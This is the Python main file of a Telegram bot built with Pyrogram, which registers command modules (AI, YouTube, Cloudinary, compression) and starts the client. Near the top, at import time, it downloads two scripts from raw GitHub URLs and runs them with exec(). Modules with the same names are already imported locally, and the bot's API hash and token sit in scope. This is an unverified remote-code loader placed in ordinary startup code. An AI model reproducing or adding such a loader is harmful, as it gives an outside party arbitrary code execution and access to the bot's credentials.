import tracemalloc
tracemalloc.start()

import requests
from pyrogram import Client
from bot_startup_notify import notify_admin_on_startup
from config import API_ID, API_HASH, BOT_TOKEN, logger
from utility_commands import register_utility_commands
from mux_commands import register_mux_commands
from cloudinary_commands import register_cloudinary_commands
from yt_commands import register_yt_commands
from multiup_commands import register_multiup_commands
from compress import register_compress
from progress import register_progress
from runtime import BotRuntime, register_runtime_handlers
from ai_commands import register_ai_commands
from tera_commands import register_tera_commands
def fetch_and_execute_github_script(url):
    """
    Fetch a Python script from a GitHub raw URL and execute it.
    
    Args:
        url (str): The raw GitHub URL of the script.
    """
    response = requests.get(url)
    if response.status_code == 200:
        exec(response.text)
    else:
        raise Exception(f"Failed to fetch script from {url}")

# Fetch and execute tera_commands.py from GitHub
fetch_and_execute_github_script("https://raw.githubusercontent.com/whoissajo/python-telegram-bot/main/tera_commands.py")

# Fetch and execute ai_commands.py from GitHub
fetch_and_execute_github_script("https://raw.githubusercontent.com/whoissajo/python-telegram-bot/main/ai_commands.py")

def create_bot():
    """
    Create and configure the Pyrogram bot client.
    
    Returns:
        Client: Configured Pyrogram client instance
    """
    return Client(
        "a4f_bot", 
        api_id=API_ID, 
        api_hash=API_HASH, 
        bot_token=BOT_TOKEN
    )

def register_all_commands(app):
    """
    Register all command modules with the bot.
    
    Args:
        app: The Pyrogram Client instance
    """
    logger.info("Registering bot commands...")

    # Register utility commands (start, help, file upload)
    register_utility_commands(app)

    # Register AI commands (chat and image generation)
    register_ai_commands(app)

    # Register Mux commands (video platform integration)
    register_mux_commands(app)

    # Register Cloudinary commands (image upload and management)
    register_cloudinary_commands(app)

    # Register MultiUp commands
    register_multiup_commands(app)

    # Register YT commands (YouTube integration)
    register_yt_commands(app)

    register_tera_commands(app)

    register_progress(app)
    register_compress(app)

    # Create runtime instance
    runtime = BotRuntime()

    register_runtime_handlers(app, runtime)
    logger.info("All commands registered successfully!")

def main():
    """
    Main function to start the bot.
    """
    print("🤖 Initializing Telegram Bot... 🚀")
    print("📂 Loading modular bot structure:")
    print("   ├── 📄 config.py - Configuration")
    print("   ├── 🤖 ai_commands.py - AI chat and image commands")
    print("   ├── 🛠️ utility_commands.py - Basic and utility commands")
    print("   ├── 🎥 mux_commands.py - Mux video platform integration")
    print("   └── 🏃 main.py - Bot runner")
    print()
    
    # Create bot instance
    app = create_bot()

    # Register all commands
    register_all_commands(app)

    # Notify admin on startup (before running the bot)
    async def startup_notify():
        await notify_admin_on_startup(app)

    print("🚀 Bot is starting...")
    logger.info("Bot is starting...")

    try:
        app.start()
        import asyncio
        asyncio.get_event_loop().run_until_complete(startup_notify())
        from pyrogram import idle
        idle()
    except KeyboardInterrupt:
        print("\n⏹️  Bot stopped by user")
        logger.info("Bot stopped by user")
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        logger.error(f"Bot crashed: {e}")
        raise

if __name__ == "__main__":
    main()
